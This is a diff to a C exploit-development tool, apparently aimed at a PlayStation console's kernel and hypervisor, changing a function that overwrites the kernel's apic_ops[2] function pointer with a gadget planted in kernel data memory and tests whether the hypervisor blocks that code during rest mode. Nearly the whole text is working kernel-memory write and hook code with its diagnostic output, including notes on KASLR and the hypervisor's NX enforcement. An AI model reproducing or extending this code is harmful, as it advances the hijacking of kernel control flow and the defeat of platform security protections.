@@ -5663,23 +5663,28 @@ static void campaign_flatz_setup(void) {
                         printf("    xapic_mode called by kernel during normal ops — no crash.\n");
 
                         /*
-                         * LEAVE MINIMAL GADGET ARMED for suspend test!
+                         * CONFIRMED: kdata execution works during normal ops
+                         * but NOT during suspend (Session 4 proved this —
+                         * minimal gadget at kdata+0x150 caused kernel panic
+                         * when left armed during suspend).
                          *
-                         * The minimal gadget (mov eax, 1; ret) has no memory
-                         * references and no stack operations — it just returns
-                         * 1 (xAPIC mode).  If the HV allows kdata execution
-                         * during suspend, this will work.  If not, it will
-                         * panic and we know we need a ktext gadget instead.
-                         *
-                         * This is THE critical test for the flatz method.
+                         * Restore original before suspend.  The HV enforces
+                         * NPT NX on kdata pages during cpususpend_handler.
+                         * Need ktext-resident code for the suspend path.
                          */
-                        printf("\n[+] LEAVING MINIMAL GADGET ARMED FOR SUSPEND TEST!\n");
-                        printf("[+] apic_ops[2] = 0x%016lx (kdata+0x%x)\n",
-                               (unsigned long)g_minimal_xapic_gadget,
-                               MINIMAL_GADGET_OFFSET);
-                        printf("[+] Code: mov eax, 1; ret (no memory refs)\n");
-                        printf("[+] If rest mode works: kdata execution during suspend is SAFE.\n");
-                        printf("[+] If panic: HV intercepts kdata during cpususpend_handler.\n");
+                        /* Restore original */
+                        kernel_copyin(&original_xapic,
+                                      g_dmap_base + ops_pa + 0x10, 8);
+                        uint64_t rv = 0;
+                        kernel_copyout(g_dmap_base + ops_pa + 0x10, &rv, 8);
+                        printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                               (unsigned long)rv,
+                               rv == original_xapic ? "OK" : "FAIL");
+
+                        printf("\n[+] DIAGNOSTIC RESULT: kdata gadget works during normal ops.\n");
+                        printf("[+] CONFIRMED (Session 4): kdata gadget PANICS during suspend.\n");
+                        printf("[+] HV enforces NPT NX on kdata during cpususpend_handler.\n");
+                        printf("[+] Need ktext-resident hook for flatz method.\n");
                     } else {
                         printf("[-] Hook write failed.\n");
                     }
@@ -5695,9 +5700,7 @@ static void campaign_flatz_setup(void) {
             printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
             if (gadget_test_passed) {
                 printf("[+]   Gadget test:    PASSED (kdata execution works normally)\n");
-                printf("[+]   apic_ops[2]:    *** MINIMAL GADGET ARMED FOR SUSPEND ***\n");
-                printf("[+]                   0x%016lx (kdata+0x%x)\n",
-                       (unsigned long)g_minimal_xapic_gadget, MINIMAL_GADGET_OFFSET);
+                printf("[+]   apic_ops[2]:    RESTORED (kdata exec panics during suspend)\n");
             } else if (hook_armed) {
                 printf("[+]   apic_ops[2]:    Cave trampoline (restored before suspend)\n");
             } else {
@@ -5712,42 +5715,30 @@ static void campaign_flatz_setup(void) {
             printf("[+]   - KASLR slide stable across resume\n");
             printf("[+]\n");
 
-            /* Enter rest mode — conditionally leave gadget armed */
+            /* Always restore apic_ops[2] before suspend.
+             *
+             * CONFIRMED (Session 4): kdata execution causes kernel panic
+             * during cpususpend_handler.  Even the minimal gadget
+             * (mov eax, 1; ret) with no memory refs panics.
+             * HV enforces NPT NX on kdata pages during suspend path.
+             *
+             * For the flatz method, we need ktext-resident code.
+             */
             {
-                if (gadget_test_passed) {
-                    /*
-                     * MINIMAL GADGET LEFT ARMED during suspend!
-                     *
-                     * apic_ops[2] points to kdata+0x150 (mov eax, 1; ret).
-                     * This is the critical flatz method test:
-                     *   - If rest mode works: kdata execution safe during suspend
-                     *   - If panic: HV intercepts kdata during cpususpend_handler
-                     */
-                    uint64_t armed_verify = 0;
-                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &armed_verify, 8);
-                    printf("[*] apic_ops[2] = 0x%016lx [%s]\n",
-                           (unsigned long)armed_verify,
-                           armed_verify == g_minimal_xapic_gadget ? "GADGET ARMED" : "UNEXPECTED");
-                    printf("[*] Entering rest mode with MINIMAL GADGET ARMED...\n");
-                    fflush(stdout);
-                    fflush(stderr);
-                    notify("[HV Research] REST MODE — minimal gadget ARMED!");
-                } else {
-                    /* Restore apic_ops[2] to original (safe path) */
-                    kernel_copyin(&original_xapic,
-                                  g_dmap_base + ops_pa + 0x10, 8);
-                    uint64_t restore_verify = 0;
-                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
-                    if (restore_verify != original_xapic) {
-                        printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
-                               (unsigned long)restore_verify);
-                    }
-                    printf("[*] apic_ops[2] restored to original.\n");
-                    fflush(stdout);
-                    fflush(stderr);
-                    notify("[HV Research] Entering rest mode (hook restored)...");
+                /* Ensure apic_ops[2] is original before suspend */
+                kernel_copyin(&original_xapic,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t restore_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
+                if (restore_verify != original_xapic) {
+                    printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
+                           (unsigned long)restore_verify);
                 }
 
+                printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
+                fflush(stdout);
+                fflush(stderr);
+                notify("[HV Research] Entering rest mode (hook restored)...");
                 sleep(3);
                 int standby_ret = sceSystemStateMgrEnterStandby();
                 printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
